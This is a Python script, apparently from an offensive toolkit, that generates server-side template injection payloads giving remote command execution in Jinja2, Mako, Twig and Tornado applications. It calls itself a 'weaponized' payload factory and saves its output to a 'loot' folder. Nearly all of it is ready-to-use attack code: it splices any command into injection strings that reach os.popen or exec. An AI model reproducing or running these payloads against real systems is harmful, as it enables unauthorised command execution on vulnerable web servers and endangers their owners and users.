import sys
import os

def generate_ssti_payload(engine, command):
    """
    Generates RCE payloads for specific template engines by 
    traversing the object hierarchy to reach 'os.popen' or 'exec'.
    """
    print(f"[*] Constructing Weaponized {engine} Payload for: {command}")
    
    payloads = {
        "jinja2": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + command + "').read() }}",
        "mako": "${os.popen('" + command + "').read()}",
        "twig": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"" + command + "\")}}",
        "tornado": "{% import os %}{{ os.popen('" + command + "').read() }}"
    }

    if engine.lower() not in payloads:
        print(f"[-] Engine '{engine}' not supported by factory.")
        return

    final_payload = payloads[engine.lower()]
    print("-" * 60)
    print(final_payload)
    print("-" * 60)

    # Save to loot
    loot_path = os.path.join("..", "loot", f"ssti_{engine}_{os.getpid()}.txt")
    with open(loot_path, "w") as f:
        f.write(final_payload)
    print(f"[+] Payload archived: {loot_path}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 128_ssti <engine: jinja2|mako|twig|tornado> <command>")
        sys.exit(1)
    
    generate_ssti_payload(sys.argv[1], sys.argv[2])
